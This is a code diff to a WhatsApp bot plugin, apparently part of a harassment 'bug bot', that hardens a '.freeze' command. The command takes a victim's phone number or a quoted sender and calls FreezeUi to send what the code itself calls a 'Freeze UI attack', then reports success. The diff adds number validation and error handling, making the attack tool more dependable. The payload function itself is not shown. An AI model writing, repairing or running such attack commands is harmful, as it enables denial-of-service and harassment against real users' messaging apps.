@@ -109,25 +109,45 @@ cmd({
     react: "❄️",
     filename: __filename
 }, async (conn, mek, msg, { from, reply, sender, args }) => {
-    let target = args[0];
-    
-    if (!target && msg.quoted) {
-        target = msg.quoted.sender;
-    }
-    
-    if (!target) {
-        return reply("❌ Please provide a target number or reply to a user's message\n\nExample: .freeze 1234567890");
-    }
-    
-    if (!target.includes('@')) {
-        target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-    }
-    
     try {
+        // FIX: Check if args exists and has value
+        let target = args && args[0] ? args[0] : null;
+        
+        // FIX: Check quoted message properly
+        if (!target && msg && msg.quoted && msg.quoted.sender) {
+            target = msg.quoted.sender;
+        }
+        
+        // FIX: Check if target is valid
+        if (!target || target === '') {
+            return reply("❌ Please provide a target number or reply to a user's message\n\nExample: .freeze 923001234567");
+        }
+        
+        // FIX: Number formatting with toString() protection
+        let cleanNumber = '';
+        try {
+            // Remove non-digits safely
+            cleanNumber = String(target).replace(/[^0-9]/g, '');
+            
+            // Check if we got a valid number
+            if (!cleanNumber || cleanNumber.length < 10) {
+                return reply("❌ Invalid phone number! Please provide a valid number.\n\nExample: .freeze 923001234567");
+            }
+            
+            // Add @s.whatsapp.net if not present
+            if (!target.includes('@')) {
+                target = cleanNumber + '@s.whatsapp.net';
+            }
+        } catch (err) {
+            return reply("❌ Error processing number: " + err.message);
+        }
+        
+        // Send attack
         await FreezeUi(conn, target);
-        reply(`✅ Freeze UI attack sent to ${target.split('@')[0]}`);
+        reply(`✅ Freeze UI attack sent to ${cleanNumber}`);
+        
     } catch (error) {
-        console.error(error);
-        reply(`❌ Error: ${error.message}`);
+        console.error('Freeze command error:', error);
+        reply(`❌ Error: ${error.message || 'Something went wrong'}`);
     }
 });
